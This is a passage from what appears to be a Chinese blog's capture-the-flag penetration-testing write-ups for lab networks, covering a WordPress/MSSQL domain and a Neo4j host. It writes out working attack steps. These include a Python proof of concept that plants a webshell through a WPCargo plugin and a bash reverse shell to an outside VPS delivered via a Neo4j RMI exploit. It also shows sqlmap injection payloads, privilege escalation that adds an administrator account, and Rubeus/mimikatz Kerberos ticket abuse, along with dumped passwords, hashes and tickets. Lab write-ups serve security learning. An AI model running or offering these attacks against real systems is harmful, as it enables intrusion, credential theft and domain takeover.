class="token punctuation">(</span>c<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'{:08b}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>encode_character_code<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>destination_url <span class="token operator">=</span> <span class="token string">'http://172.22.2.18/'</span>cmd <span class="token operator">=</span> <span class="token string">'ls'</span><span class="token comment"># With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>destination_url<span class="token punctuation">}</span></span><span class="token string">wp-content/plugins/wpcargo/includes/barcode.php?text=</span><span class="token interpolation"><span class="token punctuation">{</span>text<span class="token punctuation">}</span></span><span class="token string">&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php"</span></span><span class="token punctuation">)</span><span class="token comment"># We have uploaded a webshell - now let's use it to execute a command.</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>destination_url<span class="token punctuation">}</span></span><span class="token string">webshell.php?1=system"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"2"</span><span class="token punctuation">:</span> cmd<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">,</span> <span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>proxychains python poc.py</code></p><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250805233356879.png" alt="image-20250805233356879"></p><p>蚁剑链接</p><pre class="line-numbers language-none"><code class="language-none">./windows_x64_admin.exe -c 39.99.134.226:44442 -s 123（一定要用windows!!)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>/var/www/html/wp-config.php</code>里找到</p><pre class="line-numbers language-none"><code class="language-none">/** The name of the database for WordPress */define( 'DB_NAME', 'wordpress' );/** Database username */define( 'DB_USER', 'wpuser' );/** Database password */define( 'DB_PASSWORD', 'WpuserEha8Fgj9' );/** Database hostname */define( 'DB_HOST', '127.0.0.1' );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是数据库连接，拿到flag02</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7cd2569af0cd6aa2b1d5fe9dc83e4d17.png"></p><hr><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>发现，且172.22.2.16为MSSQLSERVER</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0fb5c812e03c173710b98659643dc0ee.png"></p><p>上传到第一个机子上用里面的fscan扫</p><pre class="line-numbers language-none"><code class="language-none">upload /home/q1n9/password.txt /tmp/1/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">./fscan -h 172.22.2.16 -m mssql -pwdf password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b115812a4019eeb1acd8f3f782d5a922.png"></p><p>或者</p><pre class="line-numbers language-none"><code class="language-none">fscan -socks socks5://127.0.0.1:xxxx -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ps:<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/99c90ff49933677552054b07b0561b7e.png"></p><hr><pre class="line-numbers language-none"><code class="language-none">java -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1dfcc699349f2614049dab0ac2517e51.png"></p><p>然后传个msf</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getsystem...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).meterpreter &gt; download C:/users/administrator/flag/flag03.txt[*] Downloading: C:/users/administrator/flag/flag03.txt -&gt; /root/flag03.txt[*] Downloaded 460.00 B of 460.00 B (100.0%): C:/users/administrator/flag/flag03.txt -&gt; /root/flag03.txt[*] Completed  : C:/users/administrator/flag/flag03.txt -&gt; /root/flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f8fe7db0e173b254abfe2ff6e867ba7d.png"></p><hr><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p><a href="https://blog.csdn.net/uuzeray/article/details/141573590">【内网渗透】最保姆级的春秋云镜Brute4Road打靶笔记-CSDN博客</a></p><pre class="line-numbers language-none"><code class="language-none">创个账户，添加管理员用户C:/Users/Public/sweetpotato.exe -a "net user yuebao pass@123 /add"C:/Users/Public/sweetpotato.exe -a "net localgroup administrators yuebao /add"yuebao pass@123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">这个不能登proxychains rdesktop 172.22.2.16 -u yuebao -d xiaorang.lab -p 'pass@123' -r disk:mydisk="/home/q1n9"proxychains -q crackmapexec smb 172.22.2.16 -u 'yuebao' -p 'pass@123'proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'Wcryyds666.' -r disk:mydisk="/home/q1n9"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>远程登陆电脑</p><p>委派攻击</p><p>这里先用域服务账号请求一个TGT</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f8f133bb3214e09e40a51e6606a0773d /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap <span class="token operator">&gt;</span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li><strong><code>asktgt</code></strong><ul><li>Rubeus 的核心功能模块之一，用于向域控制器请求 <strong>TGT 票据</strong>（Kerberos 认证的第一步，获取 TGT 后才能进一步请求访问特定服务的 TGS 票据）。</li></ul></li><li><strong><code>/user:MSSQLSERVER$</code></strong><ul><li>指定请求 TGT 的用户账户，这里的 <code>MSSQLSERVER$</code> 是一个 <strong>计算机账户</strong>（域内计算机账户的名称格式为 “计算机名 +$”，通常用于运行服务的系统账户）。</li><li>例如，这可能是域内运行 SQL Server 服务的计算机的账户。</li></ul></li><li><strong><code>/rc4:f8f133bb3214e09e40a51e6606a0773d</code></strong><ul><li>指定该用户账户的 <strong>RC4-HMAC 哈希值</strong>（即 NTLM 哈希的一种表现形式）。</li><li>Kerberos 认证中，客户端需用用户哈希加密时间戳等信息向域控制器证明身份，此处直接提供哈希可绕过明文密码，适用于已知哈希但不知道明文的场景。</li></ul></li><li><strong><code>/domain:xiaorang.lab</code></strong><ul><li>指定目标域的名称（<code>xiaorang.lab</code>），即该用户所在的 Active Directory 域。</li></ul></li><li><strong><code>/dc:DC.xiaorang.lab</code></strong><ul><li>指定域控制器（DC）的主机名（<code>DC.xiaorang.lab</code>），强制向该域控制器发送 TGT 请求（避免自动选择 DC 可能带来的延迟或错误）。</li></ul></li><li><strong><code>/nowrap</code></strong><ul><li>输出结果时 <strong>不自动换行</strong>，确保票据内容（通常是长字符串）在一行内完整显示，方便后续处理（如复制、解析）。</li></ul></li><li><strong><code>&gt; 1.txt</code></strong><ul><li>重定向命令输出到文件 <code>1.txt</code> 中，将获取到的 TGT 票据（通常是 Base64 编码的字符串）保存到本地，供后续使用（如票据传递攻击）。</li></ul></li></ol></blockquote><p>将票据注入内存：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3mqT2HLKODSL5gTZGEOj875RcDvOA6sFDvnzBxCPBkjgmE2+YHrdS4LFecFsizumMu44zCJHdTmNJMgn7/jmRdvHDZVRmjPCwhUeVykTfr7uZZIRjNZ7glF+15f+w2xs2LJC/OTkMW7prs7o/naKMSKKVAoAf2JVhOhotTX44Vku9kbl3ZirquGXaO5jekCUJx9hYEwspAKtL1C+hhHb1TNGGO460HBpP7ZrhvVPjkoSv/7+RJMm0OlAuv2tVANu9vnEy7MYBSSX3i3OBO5hxlkjF9aygQmMArjZWwtqQYULOmIflvlUimSW0OwXAjcURcFJgu6vJHTmKhl4ealC6Gy0or9+P53d+LSGRt15AGleRnPljwIyFTLGpQNl2S24X2xB2OTFPBafHPjmeg8AjEJi47MjanJBZrANhvCsHt4nnuhD2PAILpAHZjRnmrS7TgM5QSREcijt7yTUfDDGaO9Siuc8g2y5IDpM+jHmzn+kRD9XH285aethCqxU0kJ6Tyy/i/B6TK50RJ8QxMrFso5rUlGSp4hYxGEO87EgIZcmk6AE13vp8rNqoeh1flfNbyNj8dzCNEfpfitbMIQUJzQRoZaFxn51YZNG8AwTbcHFvBCh7PtMi5KUmqk2FvuRPT1KuiiUVj2RDShKQzgINIQkcG7is505dOb+kzp7R1pH2+sf5fDgzlbmVwxaC3ueJ+Emi+AevLYZd9hidWVuO+kUp6vCUuXo7pE+aq3UsMDt9Ary206NzlxmJElTqktpB/HBzub12QgAK10Qyn/9bPUANAIDE8+P0jB1gcRSZErZ78vT7QBpd2Ua2kkrsOFqH73x424d+B3VxsnM9cQldMdpAXS5Zk5IakAJIwv5KjNYzTmBWlbCEjAInmeVYJomOa4iH8DNJZZXGYRNN22DnkQAepPcyQCHXmVaTac4Pre1TuIIntKN4k5EORhO9zgCfS54/QiiSMXL9EbxPqN/09y68IQE8AaB0wrXfptLkq2NxvNSs8IGv9Tm4LL/d62cnmgUSYlX4s8P5vyQ0vhO0JIYLkKmJjOFHZ3i0safyO21oqt5rf59XRcHOQBMciW/4bnRWzuIZ2aQD9AIM69FXUCTrju5YgfbHtMKy8ZUuA7IQRQ+IxjqzCMRc8Igsxz7ks1jA7B5AdWPly0sa6V3sR/KMfIqJ8vHCMdPeq+BdgEpfPqKExEku827QeP5LtoFawN9uNv4rq/FgeOCxyF/7Snqr8czJYAIXc5YufxiTED67e8s4i9L9q37imtrCeCrEQM1gHAG4yZAZiwbnxwx7lRBVjx0eG8hcaQNOwAivEuAGJhhVMbeBHIb7a+sYrJMdQhTEQM1HednyTxjRnvEnTJgi4v0z/q169fMnXZ+SO9gR+ykNHNlNgJGacHDJ7M0W8yxQCvdR2Mb/1zupi8MJ2gU7YJ13nmAdrORGtFbUyivTSoe0DVeYLI/stK7ajgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBB9EbE3qUL80WOcIHVo5lCboQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMTIxMDA5NDQyMFqmERgPMjAyMzEyMTAxOTQ0MjBapxEYDzIwMjMxMjE3MDk0NDIwWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li><p><strong><code>s4u</code></strong></p><ul><li><p>Rubeus 的核心功能模块，用于利用 Kerberos 的</p><p>S4U（Service for User）扩展协议</p><p>，包括 S4U2Self 和 S4U2Proxy 两种操作：</p><ul><li>S4U2Self：以自身身份请求一个 “模拟其他用户” 的 TGS 票据。</li><li>S4U2Proxy：使用模拟票据请求访问目标服务的 TGS 票据。</li></ul></li><li><p>合起来实现 “以 A 用户身份模拟 B 用户访问 C 服务” 的功能，是域渗透中权限提升的重要手段（如利用服务委派）。</p></li></ul></li><li><p><strong><code>/impersonateuser:Administrator</code></strong></p><ul><li>指定要模拟的用户，这里是域管理员账户 <code>Administrator</code>（目标是获取该高权限用户的访问票据）。</li></ul></li><li><p><strong><code>/msdsspn:CIFS/DC.xiaorang.lab</code></strong></p><ul><li>指定目标服务的 SPN（服务主体名称），<code>CIFS/DC.xiaorang.lab</code> 表示域控制器（<code>DC.xiaorang.lab</code>）上的 <strong>CIFS 服务</strong>（Common Internet File System，用于文件共享，对应 Windows 的文件和打印机共享服务）。</li><li>即最终要访问的服务是域控制器的文件共享服务。</li></ul></li><li><p><strong><code>/dc:DC.xiaorang.lab</code></strong></p><ul><li>指定域控制器（DC）的主机名，强制向该 DC 发送 S4U 请求，确保与目标域控制器通信。</li></ul></li><li><p><strong><code>/ptt</code></strong></p><ul><li><strong>Pass-the-Ticket</strong> 的缩写，意为将获取到的票据 <strong>注入当前会话的内存</strong>，使得当前进程可以直接使用该票据访问目标服务（无需手动处理票据文件）。</li></ul></li><li><p><strong><code>/ticket:doIFmjCCBZagA...</code></strong></p><ul><li>指定已有的 TGT 票据（Base64 编码的长字符串），作为 S4U 操作的 “初始票据”。</li><li>该票据通常是之前通过 <code>asktgt</code> 命令获取的某个用户 / 计算机账户的 TGT（例如你之前操作中 <code>MSSQLSERVER$</code> 账户的 TGT），S4U 操作需要以此为基础发起请求。</li></ul></li><li><p><strong><code>&gt; 1.txt</code>（此处省略，命令未显式包含，但常见用法）</strong></p><ul><li>若添加此参数，会将生成的票据保存到文件，此处未包含则结合 <code>/ptt</code> 直接注入内存。</li></ul></li></ol></blockquote><p>之后执行即可看到flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">type</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>DC.xiaorang.lab<span class="token punctuation">\</span>C$<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>flag<span class="token punctuation">\</span>flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag04：flag{fe280970-c38c-45d5-9ff9-e271c1c4ab54}</p><p>启用 Windows 的远程桌面功能（不启用连接远程桌面会显示没有授权此目标用户）</p><p><code>systeminfo</code><br>发现该用户已经在域中<br>然后打约束委派攻击<br>准备好工具mimikatz和kekeo<br>管理员权限运行mimikatz 导出MSSQLSERVER的票据</p><pre class="line-numbers language-none"><code class="language-none">提升权限命令privilege::debug导出lsass.exe进程中所有的票据sekurlsa::tickets /exportexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来用kekeo申请服务票据</p><pre class="line-numbers language-none"><code class="language-none">使用TGT认购权证，利用S4U协议，以Administrator@XIAORANG.LAB用户身份申请一张访问cifs/DC.XIAORANG.LAB服务的ST服务票据，并导入到内存中tgs::s4u /tgt:[0;3e4]-2-1-40e10000-MSSQLSERVER$@krbtgt-XIAORANG.LAB.kirbi /user:Administrator@XIAORANG.LAB /service:cifs/DC.XIAORANG.LABexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mimikatz打ptt（pass the ticket），Mimikatz 的 kerberos::ptt 功能可以将现有的 Kerberos 票据提交到内存中，也就是常说的 “票据传递”。</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt TGS_Administrator@XIAORANG.LAB@XIAORANG.LAB_cifs~DC.XIAORANG.LAB@XIAORANG.LAB.kirbiexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样我们就可以直接访问域控机上的flag04.txt啦</p><pre class="line-numbers language-none"><code class="language-none">C:\xx&gt;type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt ######:                                               ###   ######:                             ## #######                         ##                   :###   #######                             ## ##   :##                        ##                  .####   ##   :##                            ## ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.## ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :####### #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ### #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .## ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ## ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .## ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ### ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :####### ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##Well done hacking!This is the final flag, you deserve it!flag04: flag{4cae4970-e873-43a5-acd1-79034f614688}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="关于委派"><a href="#关于委派" class="headerlink" title="关于委派"></a>关于委派</h3><p>域委派的用户<br>在域内的可以委派的账户有两种：<br>一种是主机账户，活动目录中的computers组内的计算机，也被称为机器账号。<br>另一种是用 setspn手动添加的服务账户。简单来说,服务账号，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如<strong>MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount</strong>，这类账号不能用于交互式登录，也就是说无法通过SqlServiceAccount来通过3389进行rdp登录<br>所以这里可以利用mimikatz导出MSSQLSERVER的票据</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>time</title>
      <link href="/2025/08/11/time/"/>
      <url>/2025/08/11/time/</url>
      
        <content type="html"><![CDATA[<h1 id="time"><a href="#time" class="headerlink" title="time"></a>time</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>39.98.107.186</p><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/tools/fscan_all_version/fscan_all_version"q1n9@LAPTOP-3H92FD9J:/mnt/d/软件工具/渗透/tools/tools/fscan_all_version/fscan_all_version$ ./fscan -h 39.98.107.186 -p 1-65535   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.8.4start infoscan39.98.107.186:22 open39.98.107.186:1337 open39.98.107.186:7474 open39.98.107.186:7473 open39.98.107.186:7687 open39.98.107.186:41409 open[*] alive ports len is: 6start vulscan[*] WebTitle http://39.98.107.186:7474 code:303 len:0      title:None 跳转url: http://39.98.107.186:7474/browser/[*] WebTitle http://39.98.107.186:7474/browser/ code:200 len:3279   title:Neo4j Browser[*] WebTitle https://39.98.107.186:7473 code:303 len:0      title:None 跳转url: https://39.98.107.186:7473/browser/[*] WebTitle https://39.98.107.186:7687 code:400 len:50     title:None[*] WebTitle https://39.98.107.186:7473/browser/ code:200 len:3279   title:Neo4j Browser已完成 6/6[*] 扫描结束,耗时: 2m52.002536904s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/725a711e779c08db45217a884046f0c3.png"></p><p><a href="https://www.cnblogs.com/Kawakaze777/p/18153842">CVE-2021-34371 Neo4j-Shell 漏洞复现 - 凪白Kw - 博客园</a></p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/139.129.20.156/7777 0&gt;&amp;1YmFzaCAtaSA+JiAvZGV2L3RjcC8xMzkuMTI5LjIwLjE1Ni83Nzc3IDA+JjE=java -jar .\rhino_gadget.jar rmi://39.99.150.67:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMzkuMTI5LjIwLjE1Ni83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"D:\软件工具\渗透\tools\马\CVE-2021-34371.jar-main&gt;java -jar .\rhino_gadget.jar rmi://39.99.150.67:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMzkuMTI5LjIwLjE1Ni83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"Trying to enumerate server bindings:Found binding: shell[+] Found valid binding, proceeding to exploit[+] Caught an unmarshalled exception, this is expected.RemoteException occurred in server thread; nested exception is:        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:        java.io.IOException[+] Exploit completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/96e50bb8e522437f19a3b32e60634b0c.png"></p><p><code>flag01: flag{71d59e48-f05f-43d4-8d98-3917d37ff490}</code></p><hr><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>在VPS上起个python内置服务器:<br>把需要下载的文件放在你执行python命令的路径下，然后执行下面的命令<br><code>python3 -m http.server 80</code><br>然后在对方机器shell中进行下载，输入下面的命令即可，这里的ip为我们的vps的外网地址，路径为文件名<br><code>wget http://139.129.20.156/linux_x64_agent</code></p><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/tools/Stotaway-bin/Stotaway-bin"./linux_x64_admin -c 39.99.150.67:11111 -s 123./linux_x64_agent -l 11111 -s 123./linux_x64_agent -l 11112 -s 123./windows_x64_admin.exe -c 39.98.107.186:11112 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">upload /home/q1n9/fscan /tmp/1/fscanneo4j@ubuntu:/tmp/1$ ip addrip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host       valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:02:f4:52 brd ff:ff:ff:ff:ff:ff    inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0       valid_lft 1892154314sec preferred_lft 1892154314sec    inet6 fe80::216:3eff:fe02:f452/64 scope link       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"> chmod +x  ./fscan ./fscan -h 172.22.6.0/24download /tmp/1/result.txt /home/q1n9/result.txt172.22.6.38:22 open172.22.6.36:22 open172.22.6.36:7687 open172.22.6.12:445 open172.22.6.25:445 open172.22.6.12:88 open172.22.6.12:139 open172.22.6.25:139 open172.22.6.12:135 open172.22.6.25:135 open172.22.6.38:80 open[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录[*] NetInfo [*]172.22.6.25   [-&gt;]WIN2019   [-&gt;]172.22.6.25[*] NetInfo [*]172.22.6.12   [-&gt;]DC-PROGAME   [-&gt;]172.22.6.12[*] NetBios 172.22.6.25     XIAORANG\WIN2019              [*] OsInfo 172.22.6.12(Windows Server 2016 Datacenter 14393)[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393#角色：域控制器（DC:DC-PROGAME.xiaorang.lab），域名为 xiaorang.lab。[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，172.22.6.25是域内成员， 172.22.6.12是域控</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aaf08b2c9826cc89838f91979c7fd178.png"></p><p>打开<a href="http://172.22.6.38/index.php%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%AA%E7%99%BB%E9%99%86">http://172.22.6.38/index.php发现是个登陆</a></p><pre class="line-numbers language-none"><code class="language-none">POST /index.php HTTP/1.1Host: 172.22.6.38Content-Length: 27Cache-Control: max-age=0Accept-Language: zh-CNUpgrade-Insecure-Requests: 1Origin: http://172.22.6.38Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://172.22.6.38/Accept-Encoding: gzip, deflate, brConnection: keep-aliveusername=admin&amp;password=123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是直接sqlmap</p><pre class="line-numbers language-none"><code class="language-none">┌──(q1n9㉿LAPTOP-3H92FD9J)-[~]└─$ proxychains4 sqlmap -u "http://172.22.6.38/index.php" --data "username=admin&amp;password=123"[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17        ___       __H__ ___ ___["]_____ ___ ___  {1.9.6#stable}|_ -| . ["]     | .'| . ||___|_  [(]_|_|_|__,|  _|      |_|V...       |_|   https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 21:56:37 /2025-08-08/[21:56:37] [INFO] resuming back-end DBMS 'mysql'[21:56:37] [INFO] testing connection to the target URL[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.6.38:80 [proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.6.38:80  ...  OK ...  OKsqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: username=admin' AND (SELECT 6533 FROM (SELECT(SLEEP(5)))kbVs) AND 'dqCy'='dqCy&amp;password=123    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: username=admin' UNION ALL SELECT NULL,CONCAT(0x716a707671,0x74734f4e524b445a59774e68514f6b6a705159546a42734a446854626c516452704c7a79704e4d42,0x7162717a71),NULL-- -&amp;password=123---[21:56:37] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)web application technology: Apache 2.4.41back-end DBMS: MySQL &gt;= 5.0.12[21:56:37] [INFO] fetched data logged to text files under '/home/q1n9/.local/share/sqlmap/output/172.22.6.38'[*] ending @ 21:56:37 /2025-08-08/proxychains4 sqlmap -u "http://172.22.6.38/index.php" --data "username=admin&amp;password=123" --dbs[*] information_schema[*] mysql[*] oa_db[*] performance_schema[*] sysproxychains4 sqlmap -u "http://172.22.6.38/index.php" --data "username=admin&amp;password=123" -D 数据库名 -T 表名 --dumpproxychains4 sqlmap -u "http://172.22.6.38/index.php" --data "username=admin&amp;password=123" -D oa_db --dump[1 entry]+----+--------------------------------------------+| id | flag02                                     